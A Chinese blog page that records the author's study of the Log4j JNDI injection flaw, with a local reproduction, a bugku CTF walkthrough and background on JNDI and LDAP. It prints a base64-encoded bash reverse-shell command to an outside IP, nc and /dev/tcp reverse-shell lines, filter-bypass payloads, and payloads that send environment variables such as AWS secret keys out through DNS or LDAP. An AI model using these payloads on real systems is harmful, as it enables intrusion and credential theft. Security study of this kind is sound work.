<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Brath-Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Brath-Blog"><meta name="msapplication-TileImage" content="https://brath.cloud/avatar.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Brath-Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="为了更好的你，也为了更好的世界"><meta property="og:type" content="blog"><meta property="og:title" content="Brath-Blog"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Brath-Blog"><meta property="og:description" content="为了更好的你，也为了更好的世界"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="Brath"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Brath-Blog","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"Brath"},"publisher":{"@type":"Organization","name":"Brath-Blog","logo":{"@type":"ImageObject","url":"https://brath.cloud/avatar.png"}},"description":"为了更好的你，也为了更好的世界"}</script><link rel="icon" href="https://brath.cloud/avatar.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://brath.cloud/avatar.png" alt="Brath-Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">文章列表</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">更多</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Guoqing815"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:48.000Z" title="2023/4/27 17:20:48">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:22:32.311Z" title="2023/4/27 17:22:32">2023-04-27</time>更新</span><span class="level-item">24 分钟读完 (大约3637个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90Log4J%E3%80%91JAVA%E5%AE%89%E5%85%A8--log4j%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/">【Log4J】JAVA安全--log4j漏洞研究分析</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="log4jjava安全log4j漏洞研究分析"><a class="markdownIt-Anchor" href="#log4jjava安全log4j漏洞研究分析">#</a> 【Log4J】JAVA 安全–log4j 漏洞研究分析</h2>
<div id="content_views" class="markdown_views prism-atom-one-light"> 
 <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path> 
 </svg> 
 <p>前言：这个漏洞很火，但是自己一直没咋研究过 算是抽空跟了下，总结了很多师傅的文章 写这篇文章进行记录下自己的学习过程吧</p> 
 <h1><a id="log4j_1"></a>log4j漏洞复现</h1> 
 <h2><a id="_2"></a><mark>本地复现</mark></h2> 
 <p>这个很多人写了 可直接参考这个<br> https://cloud.tencent.com/developer/article/1917856</p> 
 <pre><code class="prism language-bash"><span class="token function">import</span> org.apache.logging.log4j.Logger<span class="token punctuation">;</span>
<span class="token function">import</span> org.apache.logging.log4j.LogManager<span class="token punctuation">;</span>
<p>public class log4jRCE <span class="token punctuation">&#123;<!-- --></span><br>
private static final Logger logger <span class="token operator">=</span> LogManager.getLogger<span class="token punctuation">(</span>log4jRCE.class<span class="token punctuation">)</span><span class="token punctuation">;</span><br>
public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span><br>
logger.error<span class="token punctuation">(</span><span class="token string">&quot;<span class="token variable">$&#123;jndi:ldap:// 服务器的地址 / TomcatBypass/Command/Base64/Y2FsYw==&#125;</span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>
<span class="token punctuation">&#125;</span><br>
<span class="token punctuation">&#125;</span></p>
<p></code></pre></p>
 <p>这篇文章里面还缺了一点东西<br> 就是idea生成jar文件的方法<br> 这里一起写出来<br> ①打开模块设置<br> <img src="https://img-blog.csdnimg.cn/d8ebe78065f64a89bc310583697bb07a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ②选模块<br> <img src="https://img-blog.csdnimg.cn/c80ad1af9e7d41e080646823d703c488.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>③选好主类以及生成的文件在哪些地方<br> <img src="https://img-blog.csdnimg.cn/d4d877b6969643438f51f2f9019bd2bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ④选择包含在项目构建中然后点击应用<br> <img src="https://img-blog.csdnimg.cn/95acb2cb63304dea8d51d75dd29c7414.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 编译生成即可<br> <img src="https://img-blog.csdnimg.cn/08fd4bd415414dca979f9b7349771ecb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 但是对于这个我是失败了的 不知道啥原因<img src="https://img-blog.csdnimg.cn/6c0a5d8594a745e4abd1c0213d119391.png" alt="在这里插入图片描述"></p> 
 <p>本地编写jar方法</p> 
 <pre><code class="prism language-bash">①把java编写为class文件
javac  Exploit.java
②把class编写为jar文件
java -jar Exploit.jar Exploit.class
</code></pre> 
 <h2><a id="_44"></a><mark>在线靶场复现</mark></h2> 
 <p>这里以bugku上的靶场为例进行复现<br> https://ctf.bugku.com/challenges/detail/id/340.html<br> <img src="https://img-blog.csdnimg.cn/76c81b1f01f04623b82176d1a99f74f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 环境配置<br> ①ldap服务<br> <img src="https://img-blog.csdnimg.cn/0fd91a1552324f52a3abf5f82f7668b6.png" alt="在这里插入图片描述"></p> 
 <p>服务器起一个ldap服务就好了<br> java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 服务器的地址<br> <img src="https://img-blog.csdnimg.cn/a34a810cfebc4625992a4661a949141b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 直接执行反弹shell<br> 即直接配置bash反弹shell命令</p> 
 <pre><code class="prism language-bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -A <span class="token string">"192.168.72.1"</span>
</code></pre> 
 <p>②nc配置（windows的话）<br> 起到获取flag的思路<br> https://eternallybored.org/misc/netcat/<br> 下载好后进行监听即可<br> nc -lvnp 端口<br> <img src="https://img-blog.csdnimg.cn/b88daebcb458429a9eee3e329d0f595c.png" alt="在这里插入图片描述"></p> 
 <p>思路1<br> 不反弹shell进行获取flag</p> 
 <pre><code class="prism language-bash">user<span class="token operator">=</span><span class="token variable">$&#123;jndi:ldap://服务器的ip:1389/TomcatBypass/TomcatEcho&#125;</span><span class="token operator">&amp;</span>pwd<span class="token operator">=</span>69be4a983341add38e2ad1e5c804568a
</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/b5df419f4de342d880d643a16afda976.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/444bc67397494e49b4bdd68a7ecf7595.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 思路2<br> 进行反弹shell获取</p> 
 <pre><code class="prism language-bash">常见反弹shell的思路
①nc ip 12345 -e /bin/sh
<p>②bash -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/ 启动 nc 服务器的 ip/9999 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1<br>
<span class="token comment">#然后先 base64 编码然后对编码后的特殊字符进行 2 层 url 转码</span></p>
<p>这台要用第一个命令，题目限定了<br>
 payload<span class="token operator">=</span><span class="token variable">$&#123;jndi:ldap:1 / 服务器 ip:1389/basic/Command/Base64 / 二层转码之后的字符&#125;</span></p>
<p></code></pre></p>
 <p>反弹shell后执行即可</p> 
 <p><img src="https://img-blog.csdnimg.cn/e08749697c9b4afa8bf3e14c080d64a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/ae8c7c82b468476a94e481ff0eba637a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/435deaf0004c4ae5b7c83372964c06fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h1><a id="_103"></a><mark>知识点分析</mark></h1> 
 <p>受影响版本<br> Apache log4j 2.0-beta9 ≤ 2.14.1<br> 组件<br> org.apache.logging.log4j，且版本号小于2.15.0-rc2</p> 
 <p>ldap基础知识以及服务原因</p> 
 <h2><a id="payload_111"></a><mark>payload总结</mark></h2> 
 <p>参考知识点：来源团队的雪晴师傅的<br> https://www.yuque.com/yq1ng/java/pbica2#xrVeI<br> 基础payload<br> ${jndi:ldap://t00ls.com/poc<br> 绕过的一些payload</p> 
 <pre><code class="prism language-bash"><span class="token variable">$&#123;jndi:ldap://domain.com/j&#125;</span>
<span class="token variable">$&#123;jndi:ldap:/domain.com/a&#125;</span>
<span class="token variable">$&#123;jndi:dns:/domain.com&#125;</span>
<span class="token variable">$&#123;jndi:dns://domain.com/j&#125;</span>
<span class="token variable">$&#123;$&#123;::-j&#125;</span><span class="token variable">$&#123;::-n&#125;</span><span class="token variable">$&#123;::-d&#125;</span><span class="token variable">$&#123;::-i&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;::-r&#125;</span><span class="token variable">$&#123;::-m&#125;</span><span class="token variable">$&#123;::-i&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;::-j&#125;</span>ndi:rmi://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:rmi://domainldap.com/j&#125;</span>
<span class="token variable">$&#123;$&#123;lower:jndi&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;lower:$&#123;lower:jndi&#125;</span><span class="token punctuation">&#125;</span>:<span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;lower:j&#125;</span><span class="token variable">$&#123;lower:n&#125;</span><span class="token variable">$&#123;lower:d&#125;</span>i:<span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;lower:j&#125;</span><span class="token variable">$&#123;upper:n&#125;</span><span class="token variable">$&#123;lower:d&#125;</span><span class="token variable">$&#123;upper:i&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;lower:r&#125;</span>m<span class="token variable">$&#123;lower:i&#125;</span><span class="token punctuation">&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:$&#123;lower:l&#125;</span><span class="token variable">$&#123;lower:d&#125;</span>a<span class="token variable">$&#123;lower:p&#125;</span>://domain.com<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;env:NaN:-j&#125;</span>ndi<span class="token variable">$&#123;env:NaN:-:&#125;</span><span class="token variable">$&#123;env:NaN:-l&#125;</span>dap<span class="token variable">$&#123;env:NaN:-:&#125;</span>//domain.com/a<span class="token punctuation">&#125;</span>
jn<span class="token variable">$&#123;env::-&#125;</span>di:
jn<span class="token variable">$&#123;date:&#125;</span>di$<span class="token punctuation">&#123;<!-- --></span>date:<span class="token string">':'</span><span class="token punctuation">&#125;</span>
j<span class="token variable">$&#123;k8s:k5:-ND&#125;</span>i<span class="token variable">$&#123;sd:k5:-:&#125;</span>
j<span class="token variable">$&#123;main:\k5:-Nd&#125;</span>i<span class="token variable">$&#123;spring:k5:-:&#125;</span>
j<span class="token variable">$&#123;sys:k5:-nD&#125;</span><span class="token variable">$&#123;lower:i$&#123;web:k5:-:&#125;</span><span class="token punctuation">&#125;</span>
j<span class="token variable">$&#123;::-nD&#125;</span>i<span class="token variable">$&#123;::-:&#125;</span>
j<span class="token variable">$&#123;EnV:K5:-nD&#125;</span>i:
j<span class="token variable">$&#123;loWer:Nd&#125;</span>i<span class="token variable">$&#123;uPper::&#125;</span>
<p></code></pre></p>
 <p>信息泄露(主要是针对不出网的)</p> 
 <pre><code class="prism language-bash"><span class="token variable">$&#123;jndi:ldap://$&#123;env:user&#125;</span>.domain.com/exp<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:dns://$&#123;hostName&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:dns://$&#123;env:COMPUTERNAME&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:dns://$&#123;env:USERDOMAIN&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:dns://$&#123;env:AWS_SECRET_ACCESS_KEY.domain.com/a&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;ctx:loginId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;map:type&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;filename&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;date:MM-dd-yyyy&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;docker:imageName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;env:USER&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;event:Marker&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;mdc:UserId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;java:runtime&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;java:vm&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;java:os&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;jndi:logging/context-name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;hostName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:accountName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:clusterName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:containerName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:host&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:labels.app&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:labels.podTemplateHash&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:masterUrl&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:namespaceId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:namespaceName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podIp&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:imageId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:imageName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;log4j:configLocation&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;log4j:configParentLocation&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;spring:spring.application.name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:myString&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:0&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:1&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:2&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:3&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:4&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:bar&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;marker&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;marker:name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;spring:profiles.active[0].domain.com/j&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;sys:logPath&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;web:rootDir&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
</code></pre> 
 <p>可检查的标头</p> 
 <pre><code class="prism language-bash">Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Authorization
Cache-Control
Cf-Connecting_ip
Client-Ip
Contact
Cookie
DNT
Forwarded
Forwarded-For
Forwarded-For-Ip
Forwarded-Proto
From
If-Modified-Since
Max-Forwards
Origin
Originating-Ip
Pragma
Referer
TE
True-Client-IP
True-Client-Ip
Upgrade
User-Agent
Via
Warning
X-ATT-DeviceId
X-Api-Version
X-Att-Deviceid
X-CSRFToken
X-Client-Ip
X-Correlation-ID
X-Csrf-Token
X-Do-Not-Track
X-Foo
X-Foo-Bar
X-Forward-For
X-Forward-Proto
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Ssl
X-Forwarder-For
X-Frame-Options
X-From
X-Geoip-Country
X-HTTP-Method-Override
X-Http-Destinationurl
X-Http-Host-Override
X-Http-Method
X-Http-Method-Override
X-Http-Path-Override
X-Https
X-Htx-Agent
X-Hub-Signature
X-If-Unmodified-Since
X-Imbo-Test-Config
X-Insight
X-Ip
X-Ip-Trail
X-Leakix
X-Originating-Ip
X-ProxyUser-Ip
X-Real-Ip
X-Remote-Addr
X-Remote-Ip
X-Request-ID
X-Requested-With
X-UIDH
X-Wap-Profile
X-XSRF-TOKEN
Authorization: Basic 
Authorization: Bearer 
Authorization: Oauth 
Authorization: Token
</code></pre> 
 <p>除ldap以外的其他构造方式</p> 
 <pre><code class="prism language-bash">jndi:ldap:/
jndi:rmi:/
jndi:ldaps:/
jndi:dns:/
jndi:nis:/
jndi:nds:/
jndi:corba:/
jndi:iiop:/
jndi:$<span class="token punctuation">&#123;<!-- --></span>
</code></pre> 
 <p>可获取查找的信息</p> 
 <pre><code class="prism language-bash"><span class="token variable">$&#123;hostName&#125;</span>
<span class="token variable">$&#123;sys:user.name&#125;</span>
<span class="token variable">$&#123;sys:user.home&#125;</span>
<span class="token variable">$&#123;sys:user.dir&#125;</span>
<span class="token variable">$&#123;sys:java.home&#125;</span>
<span class="token variable">$&#123;sys:java.vendor&#125;</span>
<span class="token variable">$&#123;sys:java.version&#125;</span>
<span class="token variable">$&#123;sys:java.vendor.url&#125;</span>
<span class="token variable">$&#123;sys:java.vm.version&#125;</span>
<span class="token variable">$&#123;sys:java.vm.vendor&#125;</span>
<span class="token variable">$&#123;sys:java.vm.name&#125;</span>
<span class="token variable">$&#123;sys:os.name&#125;</span>
<span class="token variable">$&#123;sys:os.arch&#125;</span>
<span class="token variable">$&#123;sys:os.version&#125;</span>
<span class="token variable">$&#123;env:JAVA_VERSION&#125;</span>
<span class="token variable">$&#123;env:AWS_SECRET_ACCESS_KEY&#125;</span>
<span class="token variable">$&#123;env:AWS_SESSION_TOKEN&#125;</span>
<span class="token variable">$&#123;env:AWS_SHARED_CREDENTIALS_FILE&#125;</span>
<span class="token variable">$&#123;env:AWS_WEB_IDENTITY_TOKEN_FILE&#125;</span>
<span class="token variable">$&#123;env:AWS_PROFILE&#125;</span>
<span class="token variable">$&#123;env:AWS_CONFIG_FILE&#125;</span>
<span class="token variable">$&#123;env:AWS_ACCESS_KEY_ID&#125;</span>
</code></pre> 
 <p>一张脑图（有一说一不是很懂这个）<br> <img src="https://img-blog.csdnimg.cn/f44b105478ca4b4ebacd60249c65cf9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h2><a id="_329"></a><mark>批量验证工具</mark></h2> 
 <p><a target="_blank" rel="noopener" href="https://github.com/inbug-team/Log4j_RCE_Tool">log4j批量检测工具</a><br> 这个是主动检测的<br> 但是自己测了下,发觉测不出东西<br> 但是主动检测的太少了 还是把这个工具扔在这里<br> <img src="https://img-blog.csdnimg.cn/8e9287f280ce40e89c435dfb54e36a3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h1><a id="_335"></a>原理研究</h1> 
 <h2><a id="_336"></a>基础知识点</h2> 
 <p>JNDI<br> 全名：Java命名和目录接口，自己理解就是定义一个名称去绑定对象或者资源进而进行操控<br> 作用：将名称与java对象或资源关联起来，进行通过名称调用到对应的对象或者资源<br> 可操控的目录与服务有： DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、WindowsXP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。</p> 
 <p>运用方法：<br> 如JNDI数据源配置（使用的原因 只配置一次①加载数据库驱动程序、②连接数据库、④关闭数据库，释放连接，减少性能消耗）<br> 这个师傅讲的比较好了 这里就不讲了</p> 
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xdp-gacl/p/3951952.html">参考链接</a></p> 
 <p><img src="https://img-blog.csdnimg.cn/6fc8cdd5e2034b02ac1cc2ce1791f925.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>LDAP(轻量目录访问协议)<br> LDAP目录服务：由目录数据库和一套访问协议组成的系统。<br> 作用：即存储描述属性的数据和详细信息的数据库。<br> 四种模型：</p> 
 <pre><code class="prism language-bash">信息模型
命名模型
功能模型
安全模型
</code></pre> 
 <p>连接LDAP数据库方法：</p> 
 <pre><code class="prism language-bash"><span class="token variable">$ldapconn</span> <span class="token operator">=</span> ldap_connect<span class="token punctuation">(</span>“10.1.8.78<span class="token string">")
